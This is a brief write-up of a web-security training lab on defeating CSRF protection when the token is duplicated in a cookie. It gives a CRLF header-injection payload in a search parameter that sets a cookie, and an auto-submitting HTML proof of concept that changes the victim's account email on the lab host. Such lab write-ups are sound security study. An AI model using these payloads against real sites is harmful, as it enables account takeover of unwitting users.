# Lab: CSRF where token is duplicated in cookie

- Token is getting duplicated in a cookie.
- Can set cookie -> `/?search=pwnersec;%0d%0aSet-cookie:%20test=test1234`
- Known `token` -> `MYgiLQ5J9nKd9QIcwxw6Pk88UXLxrlxw`

- Exploit ->

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
	<img src="https://ac911f8b1e50b5fcc0b21df300da003d.web-security-academy.net/?search=pwnersec;%0d%0aSet-cookie:%20csrf=MYgiLQ5J9nKd9QIcwxw6Pk88UXLxrlxw" />
    <form action="https://ac911f8b1e50b5fcc0b21df300da003d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="root&#64;pwnersec&#46;hacks" />
      <input type="hidden" name="csrf" value="MYgiLQ5J9nKd9QIcwxw6Pk88UXLxrlxw" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

- Using attacker's `token` in both request `parameter` & csrf `cookie`, the attack is possible.

